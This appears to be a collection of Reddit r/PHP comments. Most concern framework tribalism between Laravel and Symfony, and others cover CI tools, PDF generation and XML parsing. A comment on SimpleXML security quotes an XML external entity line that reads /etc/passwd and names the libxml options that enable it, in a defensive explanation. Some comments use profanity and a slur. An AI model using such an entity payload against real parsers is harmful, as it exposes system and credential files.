I don't know why Fabien even bothers quoting some random moron from the Internet. Maybe it's not the fact that Fabien is hurt, but that he's amused. The quote says approximately "Fabien, cancel your [expletive] project, and leave more space for Taylor and his Laravel." See, Laravel depends on Symfony components. If there's no Symfony, there's no Laravel.
Is there any discounts for the *Test Driven Laravel* course by *Adam Wathan*? It is sooo costly! When all you earn is $350/month, spending $200 on a course is just not feasible :( Really wanted to go through that course. 
What is this TMZ, why do you care about gossip? PHP is used for work. Who gives a rats ass what people care about.
I don't think *random moron* fits well here. There was a poll on makefile for Symfony 4. Somebody wrote that there
&gt;be it here in Reddit or in Twitter. There is always a positive vibe Which Reddit are you using?
It is a shame some people feel the need to take things to this level. It is also funny, in a /r/sadcringe sort of way, how this "developer" doesn't realize how Laravel wouldn't be Laravel (at least how everyone knows it today) without Symfony. It is refreshing, though, to see the support given in reply to that tweet. 
Yes. Especially when Tylor replied. 
I give a rats ass. Similar to the taboo discussion of Codes of Conduct, I find it very telling of the asinine mentality that some people hold in this development community.
&gt; people are fucking stupid Eureka! Programming has nothing to do with it.
I think it's easy to forgot that a lot of the people writing comments like these (though not all) are literally children. Lots of people pick up programming in their early teens, when being fiercely tribal and irrationally angry is quite common. Most professionals realise they're just tools and have seen enough come and go to realise the tribalism is pointless and counter-productive, and while there are strong disagreements and some adults certainly go too far in their defence of their chosen framework, a lot of the truly toxic comments are going to be from people in their early to mid teens. You see the same thing in other disciplines that have a lot of young hobbyist enthusiasts. Professional mechanics tend to be a lot more reasonable about tool loyalty than young petrolheads, who possibly don't even use the tools they fetishize. The most common problem I see in this subreddit (and pretty much any language/framework community) is people in vastly different industries or with very different requirements thinking that *their* chosen tools and *their* methodology are applicable across the board. I've received several very colourful private messages in the past when I've defended Laravel in here (I'm a shameless fan of both Symfony and Laravel and have used both on considerably large enterprise projects), but I've always just assumed the person sending the message is a kid who hasnt got much life experience or perspective yet and brushed it off.
US just had Hillary vs Trump, which was a lot of the time at the same kinda retarded level. Apple vs Microsoft. PS4 vs XBox vs PC Master Race. Vegan vs Meat lovers. It's not PHP, it's (sadly) human nature. Some people feel a need to hate. Some kind of (monkey level) group behavior, and a need to validate your own choices and opinions.
&gt; their chosen tools and their methodology are applicable across the board That is exactly what I am trying to say. Sick of all these *fanboyism*
&gt; The most common problem I see in this subreddit (and pretty much any language/framework community) is people in vastly different industries or with very different requirements thinking that their chosen tools and their methodology are applicable across the board. This. So much this.
&gt; I think it's easy to forgot that a lot of the people writing comments like these (though not all) are literally children. Lots of people pick up programming in their early teens, when being fiercely tribal and irrationally angry is quite common. &gt; Unfortunately you're completely wrong. It's like people who say that most online trolls are 12 yo boys when it was demonstrated a good chunk of them are unemployed females in there 30's. Plenty of grown ups engage in these stupid framework wars.
And I have downvoted you as well.
This is really great! I think this simplifies development of i.e. PHP precompiler or even new languages for specific use cases. So this is good for the community!
I agree. It makes a difference because now with all the garbage toxicity towards languages like PHP and Javascript, they just polarize people on frameworks or dissuade new developers from even trying them or even discourage those currently working in them, as if developers don't already have enough problems settling committing to a language or framework already. The less people using a language or framework, the smaller of a community you have and the less people you have willing to continue to improve it, both of which are essential to any language. So yes, it does matter and I feel like this uninhibited toxicity and smack talk that isn't constructive whatsoever is really hurting all programmers in the long run. 
Glad that you agree. Seeing this thread getting downvoted, I was wondering if I'm the only one who thinks this fanboyism is actually hurting the community!
Gitlab CI.
You just need a wrapper library as the CLI for Chrome PDF printing is pretty limited.
Other than this sub and one semi active php forum I have no idea where to go to experience or participate in the php community so I miss all that kind of stuff. But I do see people taking shots at php everywhere while the level of shit talking about JS seems to have dropped to zero although the overabundance of js tooling seems to be a pain point.
My comment perhaps wasn't clear enough, but I wasn't trying to suggest that the framework wars aren't mostly argued, pointlessly, by adults and often heatedly, but I do think a lot of the more lazily toxic comments, like the one Fabien linked, are from teenagers. Perhaps I'm wrong.
I don't use twitter, they should posted the survey in symfony docs. That way will be answered by real symfony users. I don't know much about Makefiles or how they will use it in next symfony version. And of course the moron who said that nonse doesn't deserve not a even tweet lol 
Here you have a small gist to implement "array_zip" (transforming an ordered set of arrays into an array of tuples): https://gist.github.com/castarco/722b60bd67cc8ae7880d4785b53819a9
Stop caring is my answer. Let people worry and cry and be polarized. That is the world. Don't worry about it just figure out your own mind and carry on.
Seems pretty random and moronic to me, but idk...
You said: "this "developer" doesn't realize how Laravel wouldn't be Laravel (at least how everyone knows it today) without Symfony". This is wrong, Laravel became famous because they started from Codeigniter and improved the framework a lot. They've taken the good parts(packages) from Symfony,which was a good decision. Laravel and Symfony are the best PHP Frameworks and they should continue on their separate paths. The fact that Laravel uses so many Symfony components demonstrates the fact that Laravel team acknowledges the high programming skills demonstrated by Symfony developers. I started with Codeigniter, went to Laravel and now I'm playing with Symfony. All of them are great frameworks. Please don't forget to mention Zend (Magento :X), Cake and YII. Good luck to all PHP Framework developers! And don't forget to search on github for Codeigniter 4. This is probably one of the most expected 2017 product launches.
I'll be honest, I feel like Taylor is part of the problem. Don't get me wrong, he has done an extraordinary thing building his Laravel ecosystem, and no one can take that away from him, but oh my word his attitude stinks. He often inflamed the community and was pushed out because of it. Anyone who remembers him from before he rage quit Reddit knows this. His rhetoric is often divisive. Even his tweet here it feels both dismissive and like he's trying to one-up Fabien with the fact he got a few "death threats". If you read further into the replies, he also dismisses out of hand someone's constructive suggestion to bring the Laravel and Symfony communities together at a conference. The fact that it would be difficult is neither here nor there. It would be no more challenging than arranging any conference. I've been to many PHP framework agnostic conferences and meet-ups. Even language agnostic ones too where PHP devs are often looked down upon. And yet they happen all the time. A good leader should not embody so much negativity. Taylor, sadly, is not a good leader. 
You do realize that I said "as we know it *today*", right? That said, with great purpose, influences the context of "Laravel wouldn't be Laravel without Symfony". But, you too have missed the point I was making: it doesn't matter much where a project like Laravel came from; what matters is where it is right now. And right now, Laravel depends on Symfony components. To your point about all of the other frameworks: I agree, and I would go so far as to say that you could say the same thing about the state of the PHP community as a whole. All frameworks – to various degrees – have helped to trebuchet productivity in PHP over the proverbial 300m mark. As a community, we need to come together and continue forging our great siege weapons against these "catapult developers" who think they alone can catapult their projects into the same greatness as our --trebuchets-- frameworks. 
It's absolutely not that I disagree, but... what do you expect this post is going to change? The people who spend their time arguing about asinine bikeshedding and framework wars aren't going to care, they're just going to think you're an idiot and carry on with what they were doing.
Oh look, it's this thread again.
If nobody cared about the state of their respective communities (programming or otherwise), then what incentive would anybody have to maintain such communities? This is especially true in the open-source community where the developers and other project leaders are volunteering their personal time to help people like you do your work (paid and unpaid both). TL;DR Nope. Not gonna stop caring. 
The /r/PHP community in and of itself contains its own level of visceral and self-loathing. But there are still people here that do care. 
I'm both disappointed and not surprised that Taylor didn't denounce this type of rhetoric outright. But as you infer: it's Taylor being Taylor. 
What has happened here is simply. Requirements have been so vague and dynamic that you've ended up abstracting and exposing significant portions of software logic in the front end to make it configurable by them. You've ended up giving the power to program in a sense to them. The only problem is that immense amount of flexibility is not only really expensive but it gives them as a user an immense amount to thing about. They're potentially shot themselves in the foot not making their requirements simple and worrying about too many cases they might not have. What they want it another layer on top of what you've built that does things like only presents the permutations of options they are really interested in.
...here's our sign?
I agree with this to some degree. Feels like I'm just giving up by not contributing at all and just letting the toxic people destroy all things I love, online, but what can we really do? Feels like trying to drain a lake one bucket at a time during a non-stop torrential downpour. 
/r/wholesomememes and /r/wholesomecomments
Oh nouuuuuu, imaginary negative internet points :'C
It just drives me crazy the circle jerking on Javascript and PHP hate on all the major programming subreddits. Javascript and PHP have come a LONG way in the last 6 years. I worked in Laravel for about a year back in 2014 and loved it (pretty easy to grasp for anyone familiar with classic OOP concepts) and React is an absolute joy to work with (just to touch on great JS frameworks). I'm just starting to generally ignore the main programming subreddits now because they literally only seem to talk non stop shit rather than give constructive criticism of any kind.
Keep it civil, guys.
&gt;the level of shit talking about JS seems to have dropped to zero Where? I feel like half of what /r/programming and similar places do these days is find tenuous ways to shoehorn potshots at JS and web development in general into every single conversation. 
If you read my other comment, I think for some, it's getting to the point that it's not worth it. You think these toxic people are gonna even care what I have to say? They already come in with the sole intention to troll and hate so I almost feel like I'm the idiot for wasting my time even bothering to argue with them. I think it's what's causing so much stress and and discord and at some point we have to realistically ask ourselves "is it worth it?" or "is this person even willing to listen or reason?"... Feel like moderate and intelligent people aren't sitting online flaming other things all day. They're working to improve themselves and their work which actually makes a difference. Guess the best we can do is contribute in meaningful and constructive ways to these languages and frameworks and hope karma works in our favor. 
I'm obviously not hanging out in the right places.
I feel like a shill with the other suggestions here, but also just migrate to GitLab to use their in built CI. https://gitlab.com/thepixeldeveloper/sitemap/pipelines/12802712 It's awesome
Travis CI + Coveralls + AppVeyor for packages with Windows specific behavior.
I think the closest is http://php.net/manual/en/function.array-combine.php , but it's not exactly your implementation. I don't know pythons zip though.
If you want pretty code coverage reports, [codecov](https://codecov.io/) can plug in nicely to achieve that. Super good combo with Gitlab CI.
Use SimpleXML unless you have a really good reason not to. XMLReader allows you traverse a document node by node, which comes in handy if you work with very large files. SimpleXML is way easier to use, and it's built to be the general, every day XML utility.
&gt; You think these toxic people are gonna even care what I have to say? They already come in with the sole intention to troll … Of course they care what you have to say: without your passion for XYZ, they wouldn't be able to feed their narcissistic ego trying to tear you down. They will use every trick in the book to keep you on the hook. This is why they say, "don't feed the trolls." &gt; Feel like moderate and intelligent people aren't sitting online flaming other things all day. They're working to improve themselves and their work which actually makes a difference. To expand on my above comment, this is exactly how to "fight the trolls": don't let yourself get caught up in their shenanigans, keep doing everything you can to better yourself and the community, and eventually the trolls will get bored and move on, or they will realize that nobody responds to their negativity and give up. And before you at it, I know that that does not happen in real life. But, that's because people keep feeding the trolls. 
I'm up to some simple tasks. Now I think SimplexML would be enough. Thanks for your advice
devs are invested in a technology platform and feel threatened by anything that isn't the same. true story.
See this is what I'm talking about. First step is to acknowledge that *fanboyism* is actually hurting the community. A lot of devs here in [/r/PHP](https://www.reddit.com/r/PHP/) are reluctant to admit that. 
Most of these frameworks do pretty much the same thing and allow you to create the same applications. Decisions made in userland code are often far more important than the framework chosen. Ignore the zealotry, write some code, and have a beer afterwards.
I'm not. Extremism of any kind and in either direction is equally bad. 
Well, I'm okay with *fanboyism* as long as people don't troll other's work. One can be a fan of Laravel or Symfony or CI or whatever, without trolling other projects.
Yep I too can recommend codecov. Comes with a really neat UI. 
Circle CI. 
Thanks subscribed! Got any more of them?
Welcome to the internet where every asshole is in the same room and can say anything to anyone
Screenshots? Why bother with them when you can just `--print-to-pdf` ? See https://developers.google.com/web/updates/2017/04/headless-chrome
I was working on a project (for state) that dompdf sucked at big PDFs (&gt;200 pages) and Prince worked quite well. It's not getting the same popularity because it costs a hellalot. 
Man I know that my advice might not be the best one about humanity or "it's just the work stuff", but I go along a life with simple rules: 1) every developer should have his/hers own project at home, to do cool things, write nice code and improve, but keep work and work emotions there, behind the working time wall. I have ~4 projects I'm doing for money, and 2 projects I'm doing for myself. In my projects I'm the king and I do as I please. So when another human being developer or manager starts to make mess - I just don't give a fuck anymore. Who cares. They dig their own grave. I'm not their mommy and nobody should be. You are a professional, not hired guy that will do everything and keep everyone pleased. 2) "Should've been done yesterday" should go fuck itself. Smile and tell that it will be done in adequate for you time and if they will try to use some kind of pressure or even say that they will fire you if you will not sit whole night coding - I think that's not the company you want to work with. I know it's difficult to leave but you will be happiest man after that. Inadequate deadlines are the worst. They will eat a developer and leave a stressed shadow which want's to lie down for about a year. 3) Whenever possible record their requests, decisions, tasks etc. After being nervous bitch I was for about 2 years I one day woke up and said: that's it, fuck it, I'm not going to give another fuck if someone at job starts to fuck the shit up by requests, tasks etc. If they want to fuck up shit - ok their deal. If they want to fuck shit up and later call you stupid - I make screenshots or ask for official request on paper with signature and my comments (how their minds making a huge mess of a project/code etc) first. Usually they back off. If not - I have everything I need to show how they fucked up and I was "told ya".
I think you are wrong about the kid thing. I’ve seen this sort of hate from RoR developers who regard PHP devs as apes. These are grown men well into their career. Tribalism is more correct but I think more specifically it is elitism and the need for some to step on others in order to elevate themselves. 
Thanks, will have to check it out.
Correct. I worked with a 50 year old Java developer who saw all other technologies as "infantile and useless." It's mind boggling that someone so smart can be so stupid. It's fine knowing *your* tool, but not understanding another and hating it for being "not your tool" is like an electrician hating a carpenter for being different. 
Anyone with experience knows that Symfony is pretty much a scam. It doesn't have real programming documentation, makes a lot of things harder and in many scenarios falls short of using real PHP. The lack of real documentation makes it a framework for non-programmers. It's really just copy and paste snippets. Need to do something different? Google for it and copy/paste the answer from stack overflow. I've spent a lot of time using Symfony and hacking around with the source. It's generally bloated and deficient for a lot of tasks. In the sheer number of cases for good developers, real seasoned web developers and veteran PHP users 95% of Symfony comprises of YAGNI and the other 5% you can DIY. There are simply, even mathematical, empirical and logical proofs you can offer for why these frameworks aren't going to produce real value except in a limited window of web development. It's made worse by that there are some RAD processes where you can actually get quite a lot out of Symfony, except the sheer majority of people are using it just to fit in and really have no idea what they're really doing. Essentially, despite it's shortcomings it has some potential in areas, which has for the most part been hijacked by pretenders, posers. It's an excellent framework for prototyping and getting something up quickly but breaks apart when you care about things like specifics, performance, simplicity, etc. I've only touched on Laravel a little and not be choice. I've turned away from it as soon as I've seen the home page. It open advertises itself as a framework for posers. A trend Symfony has helped promote now that all up and coming frameworks have to cater to posers.
This is the only comment that matters. 
This post was removed because you have a new account and we get a lot of spam from newly created accounts. If you have any questions or think your post should be reinstated, please send a message to the mods. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/PHP) if you have any questions or concerns.*
This. Also, I've never been a fan of symfony "framework", but I use their components all the time, and there is simply nothing better in my opinion.
I have to second this from someone who has been having to do this since before wkhtmltox. It's a life saver and I now have it happily spitting out hundreds of thousands of essential printouts from data to invoices to receipts.
A whole package for a simple function like this seems a bit silly. I think I'd rather just be explicit in my code. The best thing I got from this was learning about. Chronos!
That's exactly what I'm talking about, dumbass.
It is, since Google Translate is worthless and gave me this: &gt; Supprime tonight is a project that Fabien et alis is the place for Taylor et al Laravel 
This could be useful.
I don't use it as a package, either. Use it however you like. Or don't ;) It's code, that I find useful, that I thought others might also. （ ^_^）o自自o（^_^ ） 
/u/WhatAboutBergzoid you have inspired me to update my readme, though
Related: how well does simple xml handle malicious XML files?
Weird, it gave me: &gt; Removes your fucking Fabien project and leaves room for Taylor and his Larave
You said &gt;&gt; ...chrome instance to save the screenshots, ... hence my reply. 
Fine, as long as we can all agree that WordPress is shit.
I would love to see this proof that a large chunk of online trolls are women in their 30s...
This is dumb.
There's a lot of places where stubs or mocks are useful. When you want to test that a method correctly throws a specific exception when an error occur upstream without being burdened by setting up something too complex to generate such error, stubs and mocks are good candidate. And sometimes reproducing an error (e.g HTTP, payment, file-system, etc.) is simply impossible without stubbings or mocking something. They are also useful when you want to test something in the past or the future. Don't get mock frameworks wrong, they don't advocate to use them everywhere, they are just tools which can provide some decent workaround in tough testing situation.
Malicious in what way? If you’re using it to build an RSS reader for example, it’s not going to sanitize the contained HTML. Anything it provides you have to treat as unsafe third-party data. 
SimpleXML doesn't do validation at all, so things like schema poisoning are totally impossible. It will catch entity reference loops and throw an error, which is good. By default it doesn't allow expansion of external entities, so something like `&lt;!ENTITY xse SYSTEM "/etc/passwd"&gt;` won't work. However combining `libxml_disable_entity_loader(false)` and the `LIBXML_NOENT` option when opening a file with SimpleXML will allow external entity resolution with no protection from foot-shooting.
I second this recommendation. SimpleXML unless you have really complex needs. If you're XML contains attributes you want to pull you might want a library like this: https://github.com/scottchiefbaker/php-XML-Simple
It's the truth.
It was ONE comment by a fucking moron. I swear I see more people complaining about toxicity than I see toxicity. 
Wow, I hadn't seen php-v8js. That is so cool. I thought it would probably be pretty slow, but then I read the Snapshots section of their github readme. That is an amazing feature. Basically like opcache but for JS/V8. I can definitely see myself using it in the future. I don't currently use Vue in any projects, but I really want to. Thanks for pointing this out!
I think we all need to stop this silly bickering and gang up on CodeIgniter.
eselente
Python's zip() function handles any iterable, including strings.
username checks out.
Just keep in mind that this is not a true equivalent of python's zip() function. For a more accurate equivalent, check out https://github.com/PythonPHP/PythonPHP Disclaimer: I'm the developer who made that.
Ok, I've looked at it again, and I'm pretty sure using Adobe Acrobat DC or Microsoft Word 2016 do very decent conversion of pdfs to word. I've tried a multipage pdf and it had a lot of things right. Acrobat yielded better results in my single pdf test, but perhaps after more tests results may vary. You'll need to run Windows with MS Word installed, and a small programme that needs to call the MS Word COM interop. This is an example with C# that can be written as a very simple commandline tool - but it should also work with PHP. See: http://php.net/manual/en/class.com.php var wordApp = new Microsoft.Office.Interop.Word.Application(); wordApp.Visible = false; wordApp.DisplayAlerts = Microsoft.Office.Interop.Word.WdAlertLevel.wdAlertsNone; var doc = wordApp.Documents.Open("c:\\temp\\test.pdf", false, true, false); doc.SaveAs("C:\\temp\\test3.docx"); wordApp.Quit(false); An even better experiment was to use adobe acrobat DC to convert files. This is by far the best conversion I've seen. It got everything right of 10+ page simple text pdf document. This uses the Adobe Acrobat COM interface. Acrobat.AcroPDDoc pdfd = new Acrobat.AcroPDDoc(); pdfd.Open("c:\\temp\\INPUT.pdf"); Object jsObj = pdfd.GetJSObject(); Type jsType = pdfd.GetType(); object[] saveAsParam = { "OUTPUT.docx", "com.adobe.acrobat.doc", "", false, false }; jsType.InvokeMember("saveAs", BindingFlags.InvokeMethod | BindingFlags.Public | BindingFlags.Instance, null, jsObj, saveAsParam, CultureInfo.InvariantCulture);
What I appreciate about this comment is that this problem is bigger than the PHP community. It is a problem with humanity yes, but also indicates somewhat of a larger global cultural and society trend. Politeness used to taught and expected of people, and contrary behavior was punished. The relative anonymity of the internet minimizes those consequences. It's easy to treat people badly when you don't see their face and they don't see yours.
Fabien, as with anything--driving, voting, developing--please ignore the idiots and losers. There are those of us who understand and value Symfony. Some loser actually took the time out of his miserable day to send that message.
I think he means things like expansion attacks (google 'billion laughs')
I think the biggest mistake is people like Fabian taking some ridiculous comment from some anon and giving it this sort of attention. The best thing about a place like Twitter is anyone can talk to anyone. Which is also the worst thing about twitter. There has always been assholes who don't know anything in all walks of life. Just ignore them and carry on.
&gt; Ignore the zealotry, write some code, and have a beer afterwards That's what is so frustrating. You can actually hate each other's work and still be mates afterwards.
It’s never going to go away 
It’s still being worked on. Possibly for 7.3
They literally just started on this 
I still prefer CakePHP honestly...
I've been using CQRS with Event sourcing for 2 years now. But still don't understand segas or the technical difference (I get the idea behind them) between processors and projectors. Love the article and will definitely share it around at work. But if anybody could explain the above two points, I'd be much appreciative 
Really depends. I’ve used the orchestra package (a facade for the actual package that I can’t recall) but the XML file was very complex. Ended up just loading the file into a string and using regex to pull what I needed. Oh and before I got to that point I tried converting to JSON then to array but deeper children missed the attributes. The regex at the end of the day did the job (and faster) but I still had some extra legwork to check for like 5-level deep nodes. 
Thank you so much for your time and effort, I'll have it a try that way
I have to agree. The behavior of Taylor (and, to an even greater extent, Graham Campbell) really push this divisiveness. Their comments, specifically on here, Twitter, and Github have always pushed a "use my project and use it the way I designed it or get out" attitude. Anyone who has ever submitted a bug report for Laravel knows its a 50/50 chance you'll be met with hostility and mockery, bordering on bullying. They do seem to be getting better, but after a few bad run ins with those two and seeing it happen to a coworker as well, it's just not worth being involved in their community in any fashion anymore. That said, I know they're making strides to improve things but the truth of the matter is *those two are the key reason this divisiveness exists*. Ottwell and Campbell created a rift in the community and while they aren't as bad as they were, I also haven't seen much in the way of attempts to repair that damage. Ottwell should be supporting Fabien here. He should be explaining that without Symfony, Laravel wouldn't be half the project it is today. Instead, he's brushing it off as if it's just another day. Which it may be. He very well may receive death threats. But it's irrelevant because the issue is not about him, it's about Fabien and Ottwell has the voice and power in the community to help mend this. But he won't and he rarely does. And it is extremely frustrating to see so often. 
https://stackoverflow.com/a/14001301/890936
All that does is remove it from the array, doesn't tell the client to forget it. You need to change the expiry time by sending the cookie again with an expiry time in the past. Something like `setcookie('name', 'content', 1);` Btw you're looking for /r/phphelp. This isn't for PHP support. See the sidebar before posting next time.
&gt;So random is not the right word. It is the right word in this context because it means "1 in a million". I have been working with Symfony heavily for the past 2 years and in all my travels online have I never been given the impression Symfony is hated. Frustrations and preferences are different, and anyone with a brain cell knows all tools have a mix of frustrations and preferences.
Woah, that's pretty cool. Atom had an extension for that, but it was applied every time. Sometimes I don't want to mess up pre-formatted code from someone else, but I like you can choose to have it do that.
Was looking exactly for this, thanks.
BitBucket Pipelines. Not my first choice but its integration with the rest of the Atlassian suite is great. 
That's true, but that's the reason why I've used the array prefix in the function name. Maybe I should implement a more generic version, but sometimes programmers have enough context information to choose very specific functions that can save CPU time. In fact, there is something that is bothers me a little bit more: the return type. I'm returning an array instead of a generator (to keep "compatibility" with the other array_* functions).
Thank you for stating this point. In fact, I think that in PHP we need two versions, one that directly returns the array, and another one that returns a generator (to save memory usage, and potentially CPU usage in some scenarios). On the other hand, I don't think that is a good idea to exactly copy the Python's zip behavior, for example... I wouldn't accept strings for type safety. On regards of your implementation, It's interesting to return a generator, but in the end, the implementation is creating a completely new list before returning the generator, so the expected memory savings that one could expect from the usage of generators isn't finally there. I understand that some people love hyper-dynamic languages, but this comes at a high cost. Specifying types helps to apply specific (and very powerful) optimizations. (I'm not saying that I've applied those potentially smart optimizations on my own implementation).
They are not the only people reading this. There are lots of others people reading this who are less actively engaged and who won't get more engaged because they see so much crap around. So seeing any push back at all encourages them that the community is worth their time. I have previously got into fights on email lists not because I had any hope of "winning" against the OP but because there was literally 1000 other people watching, and I wanted them to hear the counter arguments and see some push back.
[QUERYPATH](https://github.com/technosophos/querypath) - I cannot recommend this enough. It's a wrapper around PHP native DOM parsing functions. [Usage guide](https://www.ibm.com/developerworks/library/os-php-querypath/index.html)
What exactly are you comparing between PHP 7.2 and PHP 7.2 DCE? Is this the difference between `opcache.optimization_level=0` and `opcache.optimization_level=-1`? If that's the case, these improvements are most likely not due to DCE.
Browsershot can covert any piece of HTML to a PDF. Behind the screens headless Chrome is used. So unlike other solutions mentioned in this thread, you can use the latest css stuff to layout your PDF https://github.com/spatie/browsershot 
I should also mention that v3 of Browsershot is in the works and will be released later this month. The big change in this version is that headless Chrome will be controlled by puppeteer, allowing more options such as placing headers and footers Although it isn’t tagged yet v3 should be pretty stable. https://github.com/spatie/browsershot/tree/v3
[Permanent](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) GitHub links: * [spatie/browsershot/.../**230f7d13d341160fe0a7dcc82f77f6cbd18efc96** (v3 → 230f7d1)](https://github.com/spatie/browsershot/tree/230f7d13d341160fe0a7dcc82f77f6cbd18efc96) ---- ^(Shoot me a PM if you think I'm doing something wrong.)^( To delete this, click) [^here](https://www.reddit.com/message/compose/?to=GitHubPermalinkBot&amp;subject=deletion&amp;message=Delete reply doe448u.)^.
It doesn't, for the lazy I used to scan with https://github.com/zendframework/ZendXml. 
... If things becomes a little more complex, I used to enjoy http://sabre.io/xml/ for writing. I guess parsing/reading is cool too.
A recent PHP frameworks that doesn't even leverage Composer and instead roll their own autoloading mechanism? No thanks
Hi, They are quite different things: - CQRS is about separating reads and writes throughout the application structure; - Event-Sourcing is about keeping a log of data/entity changes, as opposed to keeping only the current state; - Saga is a long running business process. For example, lets suppose we have a micro-services context where MS A starts a business process and to continue it needs MS B to perform some task. However this tas in MS B takes a long time, might take seconds or months, maybe we don't even know how much time it might take. At some point, MS B is done with the task and reports back to MS A so it can continue the business process it started. Technically, the messages exchanged, the "conversation", will carry a "conversation" ID so that MS A can identify the conversation when it receives the message from MS B and can continue the process where it left off. I hope this helped. :) 
I'm actually thinking about seeing if I can integrate it into PHP/Laravel directly. I'd like to have vue component in PHP/Blade templates, and to be able to replace them with the equivalent HTML in a response middleware... Easy SEO (content is fully loaded) and no first load AJAX crazyness. But I'm not sure it's doable without a full SPA in the client side, and if it is, it's not that usefull anymore. Anyone having ideas (or having already done it) is welcomed to get in touch \^\^
Is wkhtmltopdf capable of producing pdfs that are larger than 300 pages?
I think this is a great direction! Was searching for such a toolkit recently and returned empty-handed. Not that there were none but their quality was abysmal. Fun fact is that I also realized I need something else: a ABNF parser generator. A few very common protocols are specified via a BNF and most of the time I want to parse data exchange specifications and not create another DSL. I yet have to scout the PHP landscape for such toolkits though. The C* and JS world is much more provided. 
You don't need to write an identity function, just pass null as the first parameter. http://php.net/manual/en/function.array-map.php Example #4 Creating an array of arrays 
Never, look at Xbox vs PlayStation, go read some of their subs, that hate is so real. As it was when it was Nintendo vs Sega. Betamax vs VHS, Intel vs amd, Nvidia vs amd, coffee vs tea, coke vs Pepsi... It doesn't stop
Thanks! I didn't remember that!
I've updated the script file to include a version for iterables
Thanks anyway
When you autoformat while having a selection, the formatting will only apply within the selection, so you can mark little bits and pieces here and there and it won't mess up formatting elsewhere in the file.
Nope, this isn't in any sense what I implemented.
I'm still waiting for welcome to my rebuttal to turn up. If you get nothing but downvotes yet no one can really respond it gives the game away. Many years ago some of the simpler less assuming frameworks in PHP made a bit more sense given that PHP had a lot of limitations. Even then however these frameworks have been problematic. I would suggest trying some occasionally because you can still learn some cool things or interesting ideas but overall I've very rarely seen a framework really pay for itself. It's just the kind of thing people pick up and use because they they'll they ought to. If they have never programmed without a pre-provided framework, they lack a point of reference from which to really know if they are getting anything out of a framework. This is human folly or human nature and you'll see it a lot. Especially in the absence of real knowledge and experience people will go with their gut. If you get any meeting of junior developers the first thing they will do is start complicating things by saying we should use this or that. You start off with one base technology and soon have a mountain. Then when these people meet a veteran it's a constant bombardment of why don't you use this, why don't you use that. The question should be the other way around. That is if you start with a base technology like PHP, and you want to add things to that the question has to be why did you add that. Removing unnecessary complexity and dependency is really important in making large maintainable software. What you see instead is immense bloat through the inclusion of unneeded libraries and frameworks before something has even got off the ground. If you ask people why they do these things there's not really much in the way of answers. First and foremost it's because it felt right. Everything else then is selected to reinforce that position. The sheer majority of applications I've seen have only been further complicated by this. They have not been made simple by adding more. This is something that's very hard to achieve. If you can't make things simple with less, you probably wont achieve it with more. Some of this is actively malicious. The intention of making things more complicated is to try to build a castle of excessive complexity on top which you can sit and shut others out. Solution and toolkit elitism becomes the standard and these people are very threatened by the notion that actually, you don't need all these things all of the time. In other cases people are a victim of this. It's more about accumulating buzzwords to get hired or not treated like crap. Much of this is in common with consumerism. Consumerism works like this. Whay aren't you wearing any clothes? Perfectly fair question. Why aren't you wearing clean clothes? Again fair enough. Why aren't you wearing well maintained clothes? Generally fair. It's not long though until it's a case of why aren't you wearing a £500 pair of trainers? Why aren't you wearing brandname X? It soon starts to become unreasonable and this kind of play ground behaviour has permeated all of software development. In the same way you can find someone wearing thousands in a fancy get up to conform to consumerism which tends to exploit our virtues, vices, our fear of fitting in or being adequate (many people suffer something similar to anorexia, they pathologically never feel adequate or always feel they have to be on top) then research a shopping list for clothing, basic utilities like a watch, etc that costs a fraction of the price but is just as functional when it comes to what really matters (telling the time, keeping warm) rather than social concerns, you can do so with software. When I reduce the framework applications to what is really needed you get a fraction and you end up getting more out of it functionally. There are many reasons for this such as frameworks catering to too many cases, being used needlessly, etc. There are things you just don't need. It's like over packing for going on holiday. You soon end up with a backpack that you are strapped to, rather than a backpack you strap to yourself. I've made my own frameworks providing only what is needed and I can tell you if done well there's a hell of a lot of difference. The immediate thing you'll notice is not a stack trace sometimes a hundred calls long and invoking many thousands of lines just to reach the entry point of your controller method. You also wont have tonnes of framework errors that are mysterious and hard to work out coming from the guts of goodness knows where. Frameworks are really inefficient because they tend to give things you just wont need and try to cater for every possible case. A hell of a lot of the time when I program something myself and then use a framework, I actually have less lines of code to do when doing it myself than when doing it in the framework. In addition to that you have a lot of promotion of bad practices in frameworks including massive YAGNI. Many frameworks can impose either soft or hard restrictions on people which can be further reinforced by the community. If you consider Symfony you quickly end up using things like yml, annotation and twig as the standard which really just replace PHP often with no benefit except "it's a bit more terse". Then you have the DB layer offering portability you might not really need. Not all of this is on Symfony but also on users who opt to use the most high level constructs as possible. On the Symfony front though it does do a lot of strange things such as in the configuration where it flattens things, then unflattens them only with the expectation of them being again flattened. They also forgot to separate internal and external to be exported configuration, there's no contract for that. When you look at the twig escaping you have another magic quotes scenario on your hands and to boot the way it encourages JavaScript escaping is something that's usually considered a pretty bad practice (you never been to template a dynamic language like JavaScript in the sheer majority of cases, the only thing you need to do is pass variables to it with JSON, it basically assumes you want to mix things that should almost never be mixed). These kinds of problems I have found in all frameworks. From bad code to bad practices. This is really the tip of the iceberg because I am constantly confronted with increased drag in frameworks that yields no benefit when I get over it. It's next to impossible to program defensively as well without looking at the source because of inappropriate documentation. They aren't something you can really have faith in. After years and years of web development with everything actually done properly I find frameworks rarely cater to that. No one knows things like how to use transactions properly and many frameworks fail to provide the appropriate implementation for this. No one knows how to do security or escaping properly and the same thing happens. The base assumption of many frameworks is that the user is an imbecile, do these things for them and they often get it wrong or guess poorly. You have a whole much of magic functions built on pure assumption. Exception routing is often wrong, generic IO validation and conversion lacking (perhaps the only thing done not too badly on that front is ORM), even bootstrapping can be a bizarre hodgepodge of madness. If people use these things with a really good reason and are humble about it there's no problem but when you have "my tool is infallible and the pinnacle of web development" then you have a problem. If you can't rip your tools apart and point out all of the deficiencies, you're not really an expert in it.
That's the kind of thing I wanted ten years ago but I've learnt to live without it.
I do it like this: function p(...$args) {static $result;if(count($args)[$result] = $args;return $result;} $p(str_repeat('ab', 2)); $p(hexbin($p())); Probably the reason it was disapproved.
I just published a new post here on reddit about Infection PHP - AST Based Mutation Testing Framework. Would you mind to share some love and upvote it? https://www.reddit.com/r/PHP/comments/76igj1/infection_php_ast_based_mutation_testing_framework/ Inside, there is a link to a detailed post on Medium about what the Mutation Testing is and how you can use Infection PHP.
Should post it in the library thread since people like downvoting everything on /r/php https://www.reddit.com/r/PHP/comments/761dqp/library_tool_discovery_thread_20171013/
